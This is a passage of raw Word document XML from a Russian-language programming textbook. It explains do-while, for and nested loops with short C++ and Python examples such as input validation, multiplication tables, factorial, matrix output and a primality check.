        </w:rPr>
        <w:t>сначала выполняет тело цикла</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>затем проверяет условие</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевая особенность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Тело цикла выполнится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хотя бы один раз</w:t>
      </w:r>
      <w:r>
        <w:t>, даже если условие изначально ложно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    Тело цикла</w:t>
        <w:br/>
        <w:t xml:space="preserve">      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ◇ Условие?</w:t>
        <w:br/>
        <w:t xml:space="preserve">    /       \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Да         Нет</w:t>
        <w:br/>
        <w:t xml:space="preserve">  /           \</w:t>
        <w:br/>
        <w:t>(повторить)  Выход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (псевдокод):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Выполнить:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;тело цикла&gt;</w:t>
        <w:br/>
        <w:t>Пока &lt;условие&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (C++):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>do {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    тело_цикла;</w:t>
        <w:br/>
        <w:t>} while (условие);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В Python нет do-while.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Но можно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>эмулировать</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while True:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    тело_цикла</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not условие:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Ввод числа с проверкой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Запросить у пользователя число от 1 до 10. Если ввёл не то — запросить снова.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (C++):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;iostream&gt;</w:t>
        <w:br/>
        <w:t>using namespace std;</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int n;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    do {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        cout &lt;&lt; "Введите число от 1 до 10: ";</w:t>
        <w:br/>
        <w:t xml:space="preserve">        cin &gt;&gt; n;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    } while (n &lt; 1 || n &gt; 10);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    cout &lt;&lt; "Вы ввели: " &lt;&lt; n &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число от 1 до 10: 15</w:t>
        <w:br/>
        <w:t>Введите число от 1 до 10: 0</w:t>
        <w:br/>
        <w:t>Введите число от 1 до 10: 7</w:t>
        <w:br/>
        <w:t>Вы ввели: 7</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему do-while?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хотя бы раз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> спросить у пользователя число. С обычным `while` пришлось бы дублировать код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эмуляция в Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while True:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    n = int(input("Введите число от 1 до 10: "))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if 1 &lt;= n &lt;= 10:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
        <w:br/>
        <w:t>print(f"Вы ввели: {n}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда использовать do-while?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ввод данных с проверкой** (пока пользователь не введёт правильное значение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Меню программы** (показать меню хотя бы один раз, затем повторять по выбору пользователя)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.6. Цикл со счётчиком (for)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл со счётчиком (for)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это конструкция для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>повторения действий заданное количество раз</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевая особенность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используется, когда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>заранее известно</w:t>
      </w:r>
      <w:r>
        <w:t>, сколько раз нужно выполнить цикл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (псевдокод):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Для i от начало до конец:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;тело цикла&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for i in range(начало, конец):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    тело_цикла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (C++):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for (инициализация; условие; инкремент) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    тело_цикла;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Вывод чисел от 1 до 10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for i in range(1, 11):  # range(1, 11) даёт [1, 2, ..., 10]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(i)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C++:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for (int i = 1; i &lt;= 10; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cout &lt;&lt; i &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
        <w:br/>
        <w:t>2</w:t>
        <w:br/>
        <w:t>3</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Сумма элементов массива</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти сумму всех элементов массива.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>arr = [3, 7, 2, 9, 5]</w:t>
        <w:br/>
        <w:t>total = 0</w:t>
        <w:br/>
        <w:t>for num in arr:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    total += num</w:t>
        <w:br/>
        <w:t>print(f"Сумма: {total}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Сумма: 26</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C++:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int arr[] = {3, 7, 2, 9, 5};</w:t>
        <w:br/>
        <w:t>int n = 5;</w:t>
        <w:br/>
        <w:t>int total = 0;</w:t>
        <w:br/>
        <w:t>for (int i = 0; i &lt; n; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    total += arr[i];</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>cout &lt;&lt; "Сумма: " &lt;&lt; total &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Таблица умножения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вывести таблицу умножения для числа 5.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = 5</w:t>
        <w:br/>
        <w:t>for i in range(1, 11):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"{n} × {i} = {n * i}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5 × 1 = 5</w:t>
        <w:br/>
        <w:t>5 × 2 = 10</w:t>
        <w:br/>
        <w:t>5 × 3 = 15</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>5 × 10 = 50</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Факториал числа (цикл for)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = 5</w:t>
        <w:br/>
        <w:t>result = 1</w:t>
        <w:br/>
        <w:t>for i in range(1, n + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result *= i</w:t>
        <w:br/>
        <w:t>print(f"{n}! = {result}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5! = 120</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.7. Вложенные циклы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вложенные циклы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>цикл внутри цикла</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Используется для работы с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>многомерными данными</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (таблицы, матрицы) или для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>перебора всех комбинаций</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Для i от 1 до n:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Для j от 1 до m:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        действие(i, j)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если внешний цикл выполняется n раз, а внутренний — m раз, то тело внутреннего цикла выполнится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n × m раз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Если n = m, то сложность </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n²)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Таблица умножения (полная)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вывести таблицу умножения от 1 до 10.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for i in range(1, 11):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for j in range(1, 11):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"{i} × {j} = {i * j}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()  # Пустая строка после каждой таблицы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод (фрагмент):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1 × 1 = 1</w:t>
        <w:br/>
        <w:t>1 × 2 = 2</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>1 × 10 = 10</w:t>
        <w:br/>
        <w:br/>
        <w:t>2 × 1 = 2</w:t>
        <w:br/>
        <w:t>2 × 2 = 4</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Матрица (двумерный массив)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вывести все элементы матрицы 3×3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>matrix = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [1, 2, 3],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [4, 5, 6],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [7, 8, 9]</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t>for i in range(3):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for j in range(3):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(matrix[i][j], end=" ")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()  # Переход на новую строку</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1 2 3</w:t>
        <w:br/>
        <w:t>4 5 6</w:t>
        <w:br/>
        <w:t>7 8 9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Проверка числа на простоту</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Проверить, является ли число `n` простым (делится только на 1 и на себя).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перебираем все числа от 2 до \(\sqrt{n}\)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если хотя бы одно из них делит `n` — число составное</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если ни одно не делит — число простое</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>import math</w:t>
        <w:br/>
        <w:br/>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:br/>
        <w:t>if n &lt; 2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Не простое")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    is_prime = True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(2, int(math.sqrt(n)) + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if n % i == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            is_prime = False</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break  # Нашли делитель, дальше проверять не нужно</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if is_prime:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("Простое")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("Не простое")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 29</w:t>
        <w:br/>
        <w:t>Простое</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
